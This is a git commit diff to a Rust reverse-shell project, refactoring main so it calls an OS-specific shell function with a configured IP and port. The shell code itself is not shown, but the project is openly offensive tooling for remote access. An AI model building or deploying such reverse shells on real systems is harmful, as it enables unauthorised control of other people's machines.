e5db98d099a3563aebbd4cdb23019a9c2569089e
Kevin <kmancxc@gmail.com>
2021-12-20 05:29:39 -0800

    move target checks out of main

--- src/basic_tcp_reverse_shell/rev_shell.rs
+++ src/basic_tcp_reverse_shell/rev_shell.rs
@@ -4,19 +4,16 @@ mod config;
 // Load the appropriate operating system's implementation
 #[cfg(unix)]
 mod unix_rs;
+#[cfg(unix)]
+use unix_rs::shell;
 
 #[cfg(windows)]
 extern crate windows;
 #[cfg(windows)]
 mod windows_rs;
+#[cfg(windows)]
+use windows_rs::shell;
 
 fn main() {
-    if cfg!(target_os = "windows"){
-        #[cfg(windows)]
-        windows_rs::shell(config::IP, config::PORT);
-    }
-    else {
-        #[cfg(unix)]
-        unix_rs::shell(config::IP, config::PORT);
-    };
+    shell(config::IP, config::PORT);
 }
